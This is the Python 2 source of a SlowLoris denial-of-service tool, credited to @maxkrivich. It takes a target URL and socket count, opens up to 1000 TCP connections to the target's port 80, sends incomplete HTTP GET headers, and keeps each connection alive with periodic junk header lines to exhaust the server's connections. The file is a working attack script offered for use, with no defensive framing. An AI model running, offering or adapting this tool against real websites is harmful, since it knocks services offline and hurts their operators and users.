#!/usr/bin/env python
# -*- coding: utf-8 -*-

import re
import os
import sys
import time
import random
import socket
import getopt
import signal
import logging
import datetime
import requests
import threading
from Queue import Queue

headers = ['User-Agent: Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9b5) Gecko/2008050509 Firefox/3.0b5',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Accept-Language: ru,en-us;q=0.7,en;q=0.3',
'Accept-Charset: windows-1251,utf-8;q=0.7,*;q=0.7',
'Connection: keep-alive']
port = 80
sockets = []
soketCount = 300
liveSockets = 0
requestsCount = 0
dieSockets = 0
numberOfBuilders = 3
URL = ''
line = '-' * 69 + '\n'
lock = threading.Lock()
logMode = 0 # 0-console, 1-file, 2-null
startTime =  datetime.datetime.now().strftime("%Y-%m-%d %H:%M")

def validateURL(url):
	regex = re.compile(
		r'^(?:http|ftp)s?://'  # http:// or https://
		r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # domain...
		r'localhost|'  # localhost...
		r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # ...or ip
		r'(?::\d+)?'  # optional port
		r'(?:/?|[/?]\S+)$', re.IGNORECASE)
	return regex.match(url)

def clearScreen():
	os.system('cls' if os.name == 'nt' else 'clear')

def parseLog():
	if logMode == 0:
		pass
	elif logMode == 1:
		#TODO: check access
		sys.stdout = open('SlowLoris_log_%s.txt' % startTime, 'w')
		sys.stderr = open('SlowLoris_log_%s_errors.txt' % startTime, 'w')
	elif logMode == 2:
		pass

def writeToLog(string):
	if logMode != 2:
		sys.stdout.write(string)
		sys.stdout.flush()

def parseArgs(argv):
	global soketCount, URL, logMode
	usage = '\nUsage: \n -u or --url\t\thttp://google.com [str]\n -s or --sockets\tsocket count in (0, 1000] [int]\n -m or --mode\t\tlog mode in [0,2] [int]\n'
	if len(argv) < 2:
		print usage
		sys.exit(-1)
	try:
		opts, argv = getopt.getopt(argv, 'hu:s:m:', ['help','url=', 'sockets=', 'mode='])
	except getopt.GetoptError:
		print usage
		sys.exit(-1)
	for opt, arg in opts:
		if opt in ('-h', '--help'):
			print usage
			sys.exit(0)
		elif opt in ('-u', '--url'):
			if validateURL(arg):
				URL = arg
			else:
				print usage
				sys.exit(-1)
		elif opt in ('-s', '--sockets'):
			cnt = int(arg)
			if 0 < cnt <= 1000:
				soketCount = cnt
			else:
				print usage
				sys.exit(-1)
		elif opt in ('-m', '--mode'):
			m = int(arg)
			if 0 <= m <= 2:
				logMode = int(m)
			else:
				print usage
				sys.exit(-1)
	if URL == '':
		print usage
		sys.exit(-1)
	parseLog()

def createSocket():
	global soketCount, liveSockets
	while True:
		if liveSockets <= soketCount:
			try:
				res = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				res.settimeout(5)
				res.connect((URL, port))
				res.send('GET /? %d HTTP/1.1\r\n' % random.randint(0, 99999))
				for h in headers:
					res.send('%s\r\n'%(h))
# TODO add mutex on append
				sockets.append(res)
				liveSockets += 1
			except Exception as e:
				pass

def sendRequest(q):
	global requestsCount, liveSockets, dieSockets
	while True:
		sok = q.get()
		try:
			sok.send('X-a: %d\r\n' % random.randint(0, 99999))
			requestsCount += 1
		except Exception as e:
			sockets.remove(sok)
			dieSockets += 1
			liveSockets -= 1
		q.task_done()

def status():
	global liveSockets, dieSockets, requestsCount
	while True:
		writeToLog('\r\t\tsend: %d die: %d alive: %d' % (requestsCount, dieSockets, liveSockets))
		time.sleep(0.3)

def run():
	global URL, soketCount, liveSockets, dieSockets, requestsCount, sockets
	writeToLog('\n\t\tSlowLoris implementation by @maxkrivich\n')
	writeToLog(line)

	response = requests.get(URL)
	serv = response.headers.get('Server')
	URL = URL.replace('https://', '')
	URL = URL.replace('http://', '')

	writeToLog('[*] Target IP:\t\t{}\n[*] Target Server:\t{}\n[*] Target Hostname:\t{}\n[*] Target Port:\t{}\n[*] Start Time:\t\t{}\n[*] Socket Count:\t{}\n'.\
		format(socket.gethostbyname(URL),serv, URL, port, startTime, soketCount))

	writeToLog(line)

	for _ in xrange(numberOfBuilders):
		t = threading.Thread(target=createSocket).start()

	while liveSockets <= soketCount:
		writeToLog('\r[*] Socket Created: %d' % liveSockets)

	liveSockets = soketCount

	writeToLog('\r[+] Socket Created: %d\n' % liveSockets)

	q = Queue(soketCount*2)

	t = threading.Thread(target=status)
	t.daemon = True
	t.start()

	for _ in xrange(numberOfBuilders):
		t = threading.Thread(target=sendRequest,args=(q, ))
		t.daemon = True
		t.start()

	while True:
		if liveSockets <= soketCount:
			time.sleep(1)
		for s in sockets[:soketCount]:
			q.put(s)
			q.join()	

def myExit(signal, frame):
	writeToLog('\n')
	writeToLog(line)
	sys.exit(0)

def main():
	# clearScreen()
	signal.signal(signal.SIGINT, myExit)
	parseArgs(sys.argv[1:])
	run()

if __name__ == '__main__':
	main()